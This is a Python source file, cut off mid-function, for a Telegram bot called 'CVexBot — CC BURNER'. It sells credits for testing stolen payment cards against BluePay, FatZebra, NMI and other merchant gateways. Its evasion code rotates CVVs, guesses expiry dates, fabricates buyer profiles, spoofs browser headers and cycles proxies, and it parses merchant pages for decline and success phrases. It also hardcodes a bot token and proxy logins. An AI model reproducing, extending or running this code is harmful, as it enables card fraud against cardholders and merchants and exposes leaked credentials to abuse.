import telebot
from telebot import types
import sqlite3, requests, re, time, random, threading, json, secrets, urllib3, logging, sys
from datetime import datetime, timedelta
from urllib.parse import quote, unquote as url_unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

urllib3.disable_warnings()

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("⚠ beautifulsoup4 missing. Run: pip install beautifulsoup4")

class _TF(logging.Filter):
    def filter(self, r):
        try: m = r.getMessage()
        except: return True
        return not any(x in m for x in ('Read timed out','ReadTimeout','HTTPSConnectionPool','502','Bad Gateway'))
logging.getLogger('TeleBot').addFilter(_TF())
logging.getLogger('TeleBot').setLevel(logging.ERROR)

# ==========================================
# CONFIG
# ==========================================
BOT_TOKEN = '8938853905:AAGkguWAZUNbXkR9A6udzzW051tJBFEcOvo'
OWNER_ID = 8366177400
FORCE_JOIN_CHANNEL = "@CvexChk"
FORCE_JOIN_LINK = "https://t.me/CvexChk"
BUY_LINK = "https://t.me/diwazz"

REQ_TIMEOUT = 12
PROXY_CHECK_TIMEOUT = 5
MAX_PROXY_STRIKES = 2
BOT_THREADS = 100

BLUEPAY_API_BASE = "https://bluepay-6q03.onrender.com"
FATZEBRA_API_BASE = "https://fatzebra.onrender.com"
NMI_API_BASE = "https://nmizebra.onrender.com"

KILLER_GATEWAYS = {
    'k1': {'name': '7Bot', 'func': 'aerojet'},
    'k2': {'name': '4Zap', 'func': 'sensia'},
    'k3': {'name': '9Byte', 'func': 'dazz'},
    'k4': {'name': '3Hub', 'func': 'microtouch'},
    'k5': {'name': '8Rush', 'func': 'ontel'},
}
HARDCODED_PROXIES = [
    "http://tickets:proxyon145@138.94.218.193:12345",
    "http://9T1GYK9U3S2B:SAWF8Y0JHSB0@5.249.177.8:5433",
    "http://tickets:proxyon145@50.3.137.177:12345"
]

# ==========================================
# EMOJIS
# ==========================================
E_BUNNY = '<tg-emoji emoji-id="5278444373615337666">🐰</tg-emoji>'
E_GIFT = '<tg-emoji emoji-id="5231070734016607712">🎁</tg-emoji>'
E_EXCLAMATION = '<tg-emoji emoji-id="5316826301611390284">‼️</tg-emoji>'
E_CHECK = '<tg-emoji emoji-id="5318760565902947324">✅</tg-emoji>'
E_CROSS = '<tg-emoji emoji-id="5316826301611390284">❌</tg-emoji>'
E_WARN = '<tg-emoji emoji-id="5278444373615337666">⚠️</tg-emoji>'
E_FLASH = '<tg-emoji emoji-id="5319070993254201336">⚡</tg-emoji>'
E_LAPTOP = '<tg-emoji emoji-id="5217876375439974417">💻</tg-emoji>'
E_DIZZY = '<tg-emoji emoji-id="5361578245928031497">💫</tg-emoji>'
E_THOUGHT = '<tg-emoji emoji-id="5456125285160226779">💭</tg-emoji>'
E_PICTURE = '<tg-emoji emoji-id="5382205393302756700">🖼</tg-emoji>'
E_FIRE = '<tg-emoji emoji-id="5116414868357907335">🔥</tg-emoji>'
E_HEART = '<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji>'
E_TOOLS = '<tg-emoji emoji-id="5445384340752053491">🛠</tg-emoji>'
E_TECH = '<tg-emoji emoji-id="5323618603411454485">🧑‍💻</tg-emoji>'
E_OCTOPUS = '<tg-emoji emoji-id="5228879218363872764">🐙</tg-emoji>'
E_SHRUG = '<tg-emoji emoji-id="5285432856636569309">🤷‍♂️</tg-emoji>'
E_CROWN = '<tg-emoji emoji-id="5438605241681476089">💎</tg-emoji>'
E_ARROW = '<tg-emoji emoji-id="5258354775757439405">➡️</tg-emoji>'
E_DOTS = '<tg-emoji emoji-id="5465629669829128119">➿</tg-emoji>'
E_STAR = '<tg-emoji emoji-id="5467641505525016018">✨</tg-emoji>'
E_LINE = E_DOTS * 9

# Button emoji IDs
BTN_KILLER = "5116414868357907335"     # fire
BTN_GATEWAY = "5319070993254201336"    # lightning
BTN_PLANS = "5231070734016607712"      # gift
BTN_TOOLS = "5445384340752053491"      # tools
BTN_ME = "5323618603411454485"         # tech
BTN_ADMIN = "5438605241681476089"      # diamond/crown
BTN_BACK = "5258354775757439405"       # arrow
BTN_REF = "5082413149873767213"        # heart
BTN_WITHDRAW = "5318760565902947324"   # check
BTN_STATS = "5467641505525016018"      # sparkle
BTN_GENPLAN = "5467641505525016018"    # sparkle (for gen plan)

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=BOT_THREADS)
user_states = {}
BIN_CACHE = {}

# ==========================================
# SAFE HELPERS
# ==========================================
def html_to_plain(txt):
    txt = re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', txt)
    txt = re.sub(r'<[^>]+>', '', txt)
    return txt

def safe_reply(msg, text, **kw):
    try: return bot.reply_to(msg, text, **kw)
    except Exception as e:
        print(f"[!] reply_to: {type(e).__name__}: {str(e)[:120]}")
        try: return bot.reply_to(msg, html_to_plain(text))
        except: return None

def safe_send(chat_id, text, **kw):
    try: return bot.send_message(chat_id, text, **kw)
    except Exception as e:
        print(f"[!] send_message: {type(e).__name__}: {str(e)[:120]}")
        try: return bot.send_message(chat_id, html_to_plain(text))
        except: return None

def safe_edit(chat_id, msg_id, text, **kw):
    if chat_id is None or msg_id is None:
        return safe_send(chat_id, text, **kw) if chat_id else False
    try: return bot.edit_message_text(text, chat_id, msg_id, **kw)
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err: return True
        print(f"[!] edit_message: {type(e).__name__}: {str(e)[:120]}")
        try: return bot.edit_message_text(html_to_plain(text), chat_id, msg_id)
        except: return False

def safe_answer(cb_id, text="", **kw):
    try: return bot.answer_callback_query(cb_id, text, **kw)
    except: return False

def crash_guard(name):
    def decorator(fn):
        def wrapper(*a, **kw):
            try: return fn(*a, **kw)
            except Exception as e:
                print(f"[CRASH {name}] {type(e).__name__}: {e}")
                import traceback; traceback.print_exc()
                try:
                    if a:
                        target = a[0]
                        if hasattr(target, 'id') and hasattr(target, 'from_user'):
                            safe_answer(target.id, "⚠ Error. Try /start", show_alert=True)
                        elif hasattr(target, 'chat'):
                            safe_reply(target, "⚠ Error. Try /start", parse_mode='HTML')
                except: pass
        return wrapper
    return decorator

# ==========================================
# STICKER
# ==========================================
def send_premium_sticker(chat_id, context="welcome"):
    st = get_setting('sticker_id', '')
    if not st or not isinstance(st, str) or not st.strip(): return False
    st = st.strip()
    try:
        if st.startswith('http://') or st.startswith('https://'):
            bot.send_photo(chat_id, st)
        else:
            bot.send_sticker(chat_id, st)
        return True
    except Exception as e:
        print(f"[STICKER-{context}] {type(e).__name__}: {str(e)[:100]}")
        return False

def send_credit_notification(uid, amount):
    try:
        send_premium_sticker(uid, "credit")
        safe_send(uid,
            f"{E_GIFT} <b>Credits Received!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_HEART} Amount : <b>{amount:+d} credits</b>\n"
            f"╰┈➤ {E_CROWN} From : <b>Admin</b>\n"
            f"╰┈➤ {E_FLASH} Status : <b>Active</b>\n"
            f"{E_LINE}\n{E_ARROW} Use /cmds to start", parse_mode='HTML')
    except: pass

def send_premium_notification(uid, days, expiry):
    try:
        send_premium_sticker(uid, "premium")
        safe_send(uid,
            f"{E_CROWN} <b>Premium Activated!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_STAR} Plan : <b>Premium</b>\n"
            f"╰┈➤ {E_FLASH} Duration : <b>{days} days</b>\n"
            f"╰┈➤ {E_HEART} Expires : <b>{expiry}</b>\n"
            f"╰┈➤ {E_CHECK} Status : <b>Active</b>\n"
            f"{E_LINE}\n{E_ARROW} Killer gateways unlocked!", parse_mode='HTML')
    except: pass

def send_withdraw_approved(uid, amount):
    try:
        send_premium_sticker(uid, "withdraw")
        safe_send(uid,
            f"{E_CHECK} <b>Withdrawal Approved!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_HEART} Amount : <b>{amount} credits</b>\n"
            f"╰┈➤ {E_FLASH} Status : <b>Approved</b>\n{E_LINE}", parse_mode='HTML')
    except: pass

def send_withdraw_declined(uid, reason, amount):
    try:
        send_premium_sticker(uid, "withdraw")
        safe_send(uid,
            f"{E_CROSS} <b>Withdrawal Declined</b>\n{E_LINE}\n"
            f"╰┈➤ {E_WARN} Reason : <b>{reason}</b>\n"
            f"╰┈➤ {E_HEART} Refund : <b>{amount} refs</b>\n{E_LINE}", parse_mode='HTML')
    except: pass

def send_referral_notification(ref_uid, new_user, total):
    try:
        send_premium_sticker(ref_uid, "referral")
        safe_send(ref_uid,
            f"{E_HEART} <b>New Referral!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_TECH} User : <b>@{new_user}</b>\n"
            f"╰┈➤ {E_STAR} Total : <b>{total}/5</b>\n"
            f"{E_LINE}\n{E_FLASH} 5 refs = 5 credits withdraw", parse_mode='HTML')
    except: pass

# ==========================================
# SESSIONS
# ==========================================
PROXY_SESSIONS = {}; PROXY_STRIKES = {}; CACHE_LOCK = threading.Lock()

def get_session(proxy_str):
    key = proxy_str or "DIRECT"
    with CACHE_LOCK:
        if key not in PROXY_SESSIONS:
            s = requests.Session()
            ad = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
            s.mount("http://", ad); s.mount("https://", ad); s.verify = False
            PROXY_SESSIONS[key] = s
        return PROXY_SESSIONS[key]

def proxy_strike(p):
    if not p: return
    with CACHE_LOCK: PROXY_STRIKES[p] = PROXY_STRIKES.get(p, 0) + 1

def is_proxy_burned(p):
    if not p: return False
    with CACHE_LOCK: return PROXY_STRIKES.get(p, 0) >= MAX_PROXY_STRIKES

# ==========================================
# DB
# ==========================================
db_local = threading.local(); db_lock = threading.Lock()

def get_db():
    if not hasattr(db_local, 'conn'):
        c = sqlite3.connect('cvex_bot.db', check_same_thread=False, timeout=30)
        for p in ["PRAGMA journal_mode=WAL","PRAGMA synchronous=NORMAL","PRAGMA cache_size=-64000",
                  "PRAGMA temp_store=MEMORY","PRAGMA busy_timeout=30000"]:
            c.execute(p)
        db_local.conn = c
    return db_local.conn

_user_cache = {}; _user_cache_lock = threading.Lock()

def get_user(uid):
    now = time.time()
    with _user_cache_lock:
        if uid in _user_cache:
            d, ts = _user_cache[uid]
            if now - ts < 5: return d
    c = get_db().cursor(); c.execute("SELECT * FROM users WHERE id=?", (uid,))
    u = c.fetchone()
    with _user_cache_lock: _user_cache[uid] = (u, now)
    return u

def invalidate_cache(uid):
    with _user_cache_lock: _user_cache.pop(uid, None)

def ensure_user(uid, uname=""):
    u = get_user(uid)
    if u is not None: return u
    try:
        create_user(uid, uname or "")
        return get_user(uid)
    except Exception as e:
        print(f"[ENSURE_USER] {type(e).__name__}: {e}")
        return None

def resolve_user_target(target):
    if not target: return None
    target = str(target).strip().lstrip('@').strip()
    if not target: return None
    if target.isdigit(): return get_user(int(target))
    try: return get_user_by_username(target)
    except: return None

# ==========================================
# 🔥 MIGRATION (CRITICAL FIX)
# ==========================================
EXPECTED_USER_ORDER = ['id','username','credits','is_premium','is_admin',
                       'expiry_date','proxies','refer_code','referred_by',
                       'banned','ref_credits','join_date','is_verified']

def migrate_users_table():
    c = get_db().cursor()
    c.execute("PRAGMA table_info(users)")
    cols = [col[1] for col in c.fetchall()]
    if not cols: return
    if cols == EXPECTED_USER_ORDER: return
    
    print(f"[MIGRATE] Users table order wrong.")
    print(f"[MIGRATE] Current : {cols}")
    print(f"[MIGRATE] Expected: {EXPECTED_USER_ORDER}")
    
    c.execute("SELECT * FROM users")
    old_rows = c.fetchall()
    print(f"[MIGRATE] Migrating {len(old_rows)} users...")
    
    try:
        c.execute("ALTER TABLE users RENAME TO users_backup")
    except:
        c.execute("DROP TABLE IF EXISTS users_backup")
        c.execute("ALTER TABLE users RENAME TO users_backup")
    
    c.execute('''CREATE TABLE users (
        id INTEGER PRIMARY KEY,
        username TEXT DEFAULT '',
        credits INTEGER DEFAULT 5,
        is_premium INTEGER DEFAULT 0,
        is_admin INTEGER DEFAULT 0,
        expiry_date TEXT DEFAULT '',
        proxies TEXT DEFAULT '',
        refer_code TEXT,
        referred_by INTEGER DEFAULT 0,
        banned INTEGER DEFAULT 0,
        ref_credits INTEGER DEFAULT 0,
        join_date TEXT,
        is_verified INTEGER DEFAULT 0
    )''')
    
    for row in old_rows:
        data = dict(zip(cols, row))
        try:
            c.execute('''INSERT INTO users 
                (id, username, credits, is_premium, is_admin, expiry_date, proxies,
                 refer_code, referred_by, banned, ref_credits, join_date, is_verified)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
                data.get('id'),
                data.get('username') or '',
                data.get('credits') if data.get('credits') is not None else 5,
                data.get('is_premium') or 0,
                data.get('is_admin') or 0,
                data.get('expiry_date') or '',
                data.get('proxies') or '',
                data.get('refer_code'),
                data.get('referred_by') or 0,
                data.get('banned') or 0,
                data.get('ref_credits') or 0,
                data.get('join_date'),
                data.get('is_verified') or 0,
            ))
        except Exception as e:
            print(f"[MIGRATE ROW ERR] {e}")
    
    c.execute("DROP TABLE users_backup")
    c.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_ref ON users(refer_code)")
    get_db().commit()
    with _user_cache_lock: _user_cache.clear()
    print(f"[MIGRATE] ✓ Done!")

def ensure_owner_in_db():
    try:
        u = get_user(OWNER_ID)
        if not u:
            create_user(OWNER_ID, "owner", 0)
            update_status(OWNER_ID, 'is_admin', 1)
            update_status(OWNER_ID, 'is_verified', 1)
            update_credits(OWNER_ID, 999999)
            print(f"   ✓ Owner created (ID: {OWNER_ID})")
        else:
            update_status(OWNER_ID, 'is_admin', 1)
            if len(u) > 12 and u[12] == 0: update_status(OWNER_ID, 'is_verified', 1)
            print(f"   ✓ Owner in DB (credits: {u[2]})")
    except Exception as e:
        print(f"   ✗ Owner ensure: {e}")

def init_db():
    with db_lock:
        c = get_db().cursor()
        
        # Users table — CORRECT order (refer_code at pos 7)
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT DEFAULT '',
            credits INTEGER DEFAULT 5,
            is_premium INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            expiry_date TEXT DEFAULT '',
            proxies TEXT DEFAULT '',
            refer_code TEXT,
            referred_by INTEGER DEFAULT 0,
            banned INTEGER DEFAULT 0,
            ref_credits INTEGER DEFAULT 0,
            join_date TEXT,
            is_verified INTEGER DEFAULT 0
        )''')
        
        # Licenses / settings / gateways / referrals / withdrawals
        c.execute('''CREATE TABLE IF NOT EXISTS licenses (key TEXT PRIMARY KEY, days INTEGER, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS gateways (cmd TEXT PRIMARY KEY, name TEXT, price TEXT, cost INTEGER, status TEXT, type TEXT, format TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (referrer_id INTEGER, referred_id INTEGER, date TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS withdrawals (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, status TEXT DEFAULT 'PENDING', reason TEXT DEFAULT '')''')
        
        # 🔥 NEW: plan_codes table
        c.execute('''CREATE TABLE IF NOT EXISTS plan_codes (
            code TEXT PRIMARY KEY,
            plan_name TEXT,
            credits INTEGER,
            price TEXT,
            days INTEGER,
            created_by INTEGER,
            created_at TEXT,
            used_by INTEGER DEFAULT 0,
            used_at TEXT
        )''')
        
        # Plans table with original_price + custom columns
        c.execute('''CREATE TABLE IF NOT EXISTS plans (
            name TEXT PRIMARY KEY,
            credits INTEGER,
            price TEXT,
            days INTEGER,
            original_price TEXT DEFAULT '',
            custom INTEGER DEFAULT 0
        )''')
        c.execute("PRAGMA table_info(plans)")
        pcols = [col[1] for col in c.fetchall()]
        if 'original_price' not in pcols: c.execute("ALTER TABLE plans ADD COLUMN original_price TEXT DEFAULT ''")
        if 'custom' not in pcols: c.execute("ALTER TABLE plans ADD COLUMN custom INTEGER DEFAULT 0")
        
        # Populate new plans
        c.execute("SELECT COUNT(*) FROM plans WHERE name IN ('SHADOW','PHANTOM','REAPER','GODMODE')")
        if c.fetchone()[0] < 4:
            c.execute("DELETE FROM plans")
            new_plans = [
                ('SHADOW', 1200, '15', 10, '20', 0),
                ('PHANTOM', 2200, '29', 18, '35', 0),
                ('REAPER', 3200, '39', 25, '50', 0),
                ('GODMODE', 0, '0', 0, '0', 1),
            ]
            for p in new_plans:
                c.execute("INSERT OR REPLACE INTO plans (name, credits, price, days, original_price, custom) VALUES (?, ?, ?, ?, ?, ?)", p)
            print("   ✓ New plans loaded (SHADOW, PHANTOM, REAPER, GODMODE)")
        
        # Gateways
        c.execute("SELECT COUNT(*) FROM gateways")
        if c.fetchone()[0] == 0:
            for g in [
                ('bl','BluePay','4$',10,'ACTIVE','FREE','cc|mm|yy|cvv'),
                ('fat','FatZebra','$1',10,'ACTIVE','FREE','cc|mm|yy|cvv'),
                ('nmi','NMI','$5',5,'ACTIVE','FREE','cc|mm|yy|cvv'),
                ('k1','7Bot','$3.04',10,'ACTIVE','PREMIUM','cc|mm|yy|cvv'),
                ('k2','4Zap','$3.04',10,'ACTIVE','PREMIUM','cc|mm|yy|cvv'),
                ('k3','9Byte','$3.04',10,'ACTIVE','PREMIUM','cc|mm|yy|cvv'),
                ('k4','3Hub','$3.04',10,'ACTIVE','PREMIUM','cc|mm|yy|cvv'),
                ('k5','8Rush','$3.04',10,'ACTIVE','PREMIUM','cc|mm|yy|cvv'),
            ]:
                c.execute("INSERT INTO gateways VALUES (?, ?, ?, ?, ?, ?, ?)", g)
        
        # Ensure every user has a refer_code
        c.execute("SELECT id FROM users WHERE refer_code IS NULL OR refer_code=''")
        for r in c.fetchall():
            c.execute("UPDATE users SET refer_code=? WHERE id=?", (secrets.token_urlsafe(8), r[0]))
        c.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_ref ON users(refer_code)")
        
        get_db().commit()

init_db()
migrate_users_table()  # runs after init

# ==========================================
# SETTINGS / HELPERS
# ==========================================
def get_setting(key, default=10):
    c = get_db().cursor(); c.execute("SELECT value FROM settings WHERE key=?", (key,))
    row = c.fetchone()
    return int(row[0]) if row and str(row[0]).isdigit() else (row[0] if row else default)

def get_default_proxies():
    v = get_setting('default_proxies', '')
    if v:
        try: return json.loads(v)
        except: pass
    return HARDCODED_PROXIES

def get_user_by_username(u):
    c = get_db().cursor()
    c.execute("SELECT * FROM users WHERE LOWER(username)=LOWER(?)", (u.replace('@','').strip(),))
    return c.fetchone()

def create_user(uid, uname, ref_by=0):
    c = get_db().cursor()
    c.execute("SELECT * FROM users WHERE id=?", (uid,))
    existing = c.fetchone()
    ref_code = secrets.token_urlsafe(8)
    jd = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if existing:
        if ref_by > 0 and ref_by != uid and existing[8] == 0:
            c.execute("UPDATE users SET referred_by=? WHERE id=?", (ref_by, uid))
            c.execute("INSERT INTO referrals (referrer_id, referred_id, date) VALUES (?, ?, ?)", (ref_by, uid, jd))
            c.execute("UPDATE users SET ref_credits = ref_credits + 1 WHERE id=?", (ref_by,))
            get_db().commit(); invalidate_cache(ref_by); invalidate_cache(uid)
            try:
                ref_u = get_user(ref_by); total = ref_u[10] if ref_u else 1
                safe_send(OWNER_ID, f"🔔 <b>NEW REFERRAL!</b>\n{E_LINE}\n👤 <b>New:</b> @{uname or uid}\n🔗 <b>By:</b> @{(ref_u[1] if ref_u and ref_u[1] else ref_by)}\n🆔 <b>Ref ID:</b> <code>{ref_by}</code>\n📊 <b>Total:</b> {total}/5\n{E_LINE}", parse_mode='HTML')
                send_referral_notification(ref_by, uname or uid, total)
            except: pass
        return False
    
    c.execute("INSERT INTO users (id, username, credits, refer_code, referred_by, join_date, is_verified) VALUES (?, ?, 5, ?, ?, ?, 0)",
              (uid, uname, ref_code, ref_by, jd))
    if ref_by > 0:
        c.execute("INSERT INTO referrals (referrer_id, referred_id, date) VALUES (?, ?, ?)", (ref_by, uid, jd))
        c.execute("UPDATE users SET ref_credits = ref_credits + 1 WHERE id=?", (ref_by,))
        get_db().commit(); invalidate_cache(ref_by)
        try:
            ref_u = get_user(ref_by); total = ref_u[10] if ref_u else 1
            safe_send(OWNER_ID, f"🔔 <b>NEW REFERRAL!</b>\n{E_LINE}\n👤 <b>New:</b> @{uname or uid}\n🔗 <b>By:</b> @{(ref_u[1] if ref_u and ref_u[1] else ref_by)}\n🆔 <b>Ref ID:</b> <code>{ref_by}</code>\n📊 <b>Total:</b> {total}/5\n{E_LINE}", parse_mode='HTML')
            send_referral_notification(ref_by, uname or uid, total)
        except: pass
    get_db().commit(); invalidate_cache(uid)
    return True

def update_credits(uid, amt):
    c = get_db().cursor(); c.execute("UPDATE users SET credits = credits + ? WHERE id=?", (amt, uid))
    get_db().commit(); invalidate_cache(uid)

def update_status(uid, field, val):
    c = get_db().cursor(); c.execute(f"UPDATE users SET {field}=? WHERE id=?", (val, uid))
    get_db().commit(); invalidate_cache(uid)

def get_gateways(t=None):
    c = get_db().cursor()
    c.execute("SELECT * FROM gateways WHERE type=?" if t else "SELECT * FROM gateways", (t,) if t else ())
    return c.fetchall()

def get_gateway(cmd):
    c = get_db().cursor(); c.execute("SELECT * FROM gateways WHERE cmd=?", (cmd,)); return c.fetchone()

def is_admin(uid):
    if uid == OWNER_ID: return True
    u = get_user(uid); return bool(u and u[4] == 1)

def has_premium(uid):
    if uid == OWNER_ID: return True
    u = get_user(uid)
    if not u: return False
    if u[4] == 1: return True
    if u[3] == 1:
        if not u[5]: return True
        try:
            if datetime.strptime(u[5], "%Y-%m-%d %H:%M:%S") > datetime.now(): return True
        except: pass
    return False

def is_banned(uid):
    u = get_user(uid); return bool(u and u[9] == 1)

def is_joined(uid):
    try: return bot.get_chat_member(FORCE_JOIN_CHANNEL, uid).status in ['creator','administrator','member']
    except: return True

_rate = {}; _rate_lock = threading.Lock()
def is_spam(uid, is_prem, is_adm):
    if is_adm: return False
    now = time.time()
    max_t = 30 if is_prem else 10; refill = 5 if is_prem else 1
    with _rate_lock:
        b = _rate.get(uid)
        if not b: _rate[uid] = [max_t - 1, now]; return False
        tok, ts = b; tok = min(max_t, tok + (now - ts) * refill)
        if tok < 1: _rate[uid] = [tok, now]; return True
        _rate[uid] = [tok - 1, now]; return False

# ==========================================
# PLANS TEXT
# ==========================================
def get_plans_text():
    c = get_db().cursor()
    c.execute("SELECT name, credits, price, days, original_price, custom FROM plans ORDER BY custom ASC, CAST(credits AS INTEGER) ASC")
    rows = c.fetchall()
    t = f"<b>{E_GIFT} Available Plans</b>\n"
    for row in rows:
        name, creds, price, days, orig_price, custom = row
        t += f"{E_LINE}\n{E_STAR} <b>Plan: {name}</b>\n"
        if custom:
            t += f"╰┈➤ {E_HEART} Credits: <b>Choose your own</b>\n"
            t += f"╰┈➤ {E_CROWN} Price: <b>Choose your own</b>\n"
            t += f"╰┈➤ {E_FLASH} Validity: <b>Choose your own</b>\n"
        else:
            price_str = f"<s>${orig_price}</s> <b>${price}</b>" if orig_price and orig_price not in ('0','') else f"<b>${price}</b>"
            t += f"╰┈➤ {E_HEART} Credits: <b>{creds:,}</b>\n"
            t += f"╰┈➤ {E_CROWN} Price: {price_str}\n"
            t += f"╰┈➤ {E_FLASH} Validity: <b>{days} Days</b>\n"
    t += f"{E_LINE}\n{E_FLASH} <b>10 Credits = 1 Kill</b>\n"
    t += f"{E_ARROW} Purchase: @diwazz"
    return t

def get_premium_required_text(cmd_name=""):
    return (f"{E_CROWN} <b>Premium Required</b>\n"
            f"{E_LINE}\n"
            f"This command requires Premium.\n"
            f"{E_LINE}\n"
            f"╰┈➤ {E_GIFT} View Plans: /plans\n"
            f"╰┈➤ {E_TECH} Contact: @diwazz\n"
            f"{E_LINE}\n"
            f"<i>10 Credits = 1 Kill</i>")

def send_welcome(chat_id, name):
    sn = name.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    send_premium_sticker(chat_id, "welcome")
    txt = (f"{E_BUNNY} <b>#.CVexBot / v5.0 / ON</b>\n"
           f"{E_LINE}\n"
           f"~/ <b>Bash@CVex</b> ~> <i>Welcome back, {sn}!</i>\n"
           f"{E_FLASH} Bot active. Use /cmds.\n"
           f"{E_LINE}\n"
           f"[<a href='https://t.me/CvexChk'>緒</a>] {E_FIRE} <b>CVexBot — CC BURNER</b>")
    safe_send(chat_id, txt, parse_mode='HTML')

# ==========================================
# BIN / PROXY
# ==========================================
def get_bin(bin_num):
    if bin_num in BIN_CACHE: return BIN_CACHE[bin_num]
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version":"3"}, timeout=4)
        if r.status_code == 200:
            d = r.json()
            res = (d.get('bank',{}).get('name','Unknown'), d.get('scheme','UNK').upper(), d.get('type','UNK').upper(), d.get('country',{}).get('name','Unknown'), d.get('country',{}).get('emoji','🏳️'))
            BIN_CACHE[bin_num] = res; return res
    except: pass
    return "Unknown","UNKNOWN","UNKNOWN","Unknown","🏳️"

def get_proxy_info(p):
    m = re.search(r'@([^:]+)', p) or re.search(r'://([^:]+)', p)
    if not m: return None
    try:
        r = requests.get(f"http://ip-api.com/json/{m.group(1)}?fields=status,country,city,isp,query", timeout=4)
        d = r.json()
        if d.get('status') == 'success':
            return {"ip":d.get('query'),"country":d.get('country'),"city":d.get('city'),"isp":d.get('isp')}
    except: pass
    return None

def check_proxy(p):
    try:
        r = requests.get("https://www.google.com", proxies={"http":p,"https":p}, timeout=PROXY_CHECK_TIMEOUT)
        return r.status_code == 200
    except: return False

def alive_proxies(lst):
    if not lst: return [None]
    alive = []
    with ThreadPoolExecutor(max_workers=len(lst)) as ex:
        for p, ok in ex.map(lambda x: (x, check_proxy(x)), lst):
            if ok: alive.append(p)
    return alive if alive else [None]

# ==========================================
# HELPERS
# ==========================================
F_NAMES = ["James","Emma","Liam","Olivia","Noah","Ava","Ethan","Sophia","Mason","Isabella"]
L_NAMES = ["Carter","Bennett","Hayes","Brooks","Foster","Sullivan","Reed","Parker","Collins","Murphy"]
CITIES = [("New York","10001","34"),("Brooklyn","11201","34"),("Queens","11375","34"),("Bronx","10451","34"),("Chicago","60601","14"),("Houston","77001","43")]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

def parse_card(raw):
    p = [x.strip() for x in raw.split("|")]
    if len(p) != 4: raise ValueError("Invalid")
    n, mo, y, cvv = p
    if len(y) == 2: y = "20" + y
    if not y.isdigit() or not (2024 <= int(y) <= 2050): raise ValueError("Year")
    if not mo.isdigit() or not (1 <= int(mo) <= 12): raise ValueError("Month")
    if not cvv.isdigit() or len(cvv) < 3: raise ValueError("CVV")
    return {"number":n,"month":str(int(mo)),"year":y,"cvv":cvv,"bin":n[:6]}

def rotate_cvvs(orig, n):
    if not orig or len(orig) < 3: return [orig] * int(n)
    prefix = orig[:-1]; start = int(orig[-1])
    out, seen = [], set()
    for i in range(int(n)):
        d = (start + i) % 10
        out.append(f"{prefix}{d}"); seen.add(d)
    return out[:int(n)]

def gen_mm_yy_list(orig_mm, orig_yy, n):
    now = datetime.now(); cy, cm = now.year, now.month
    out = [(str(orig_mm).zfill(2), orig_yy)]
    for _ in range(int(n) - 1):
        y = random.randint(cy, cy + 5)
        m = random.randint(cm, 12) if y == cy else random.randint(1, 12)
        out.append((str(m).zfill(2), str(y)))
    return out

def gen_profile():
    fn = random.choice(F_NAMES); ln = random.choice(L_NAMES); city, zp, st = random.choice(CITIES)
    return {"first_name":fn,"last_name":ln,"email":f"{fn.lower()}.{ln.lower()}{random.randint(10,9999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}",
            "phone":f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}",
            "address1":f"{random.randint(100,9999)} Main St","address2":"","zip":zp,"city":city,"state_id":st,"country_id":"1"}

def fresh_session(proxy_str=None):
    s = get_session(proxy_str)
    s.cookies.clear()
    s.headers.update({
        "User-Agent": random.choice(UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none", "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1", "dnt": "1",
    })
    return s

# ==========================================
# ANALYZER
# ==========================================
DECLINE_PHRASES = [
    "transaction was declined", "card was declined", "card has been declined",
    "payment was declined", "payment has been declined",
    "your card was declined", "your card has been declined",
    "insufficient funds", "do not honor", "not authorized", "not approved",
    "invalid card", "invalid credit card", "invalid cvv", "cvv is incorrect",
    "incorrect cvv", "cvv mismatch", "expired card", "card has expired",
    "unable to process your payment", "could not process your payment",
    "cannot process your payment", "please try another card",
    "please use a different card", "please check your card",
    "order failed", "error processing your", "processing error",
]
SUCCESS_PHRASES = [
    "thank you for your order", "your order has been placed",
    "your order was placed", "order has been confirmed", "order was confirmed",
    "order confirmation", "purchase complete", "purchase was successful",
    "payment received", "payment was successful",
]

def extract_visible_text(html):
    if not html: return ""
    if HAS_BS4:
        try:
            h = re.sub(r"<script\b[^>]*>.*?</script>", " ", html, flags=re.DOTALL|re.I)
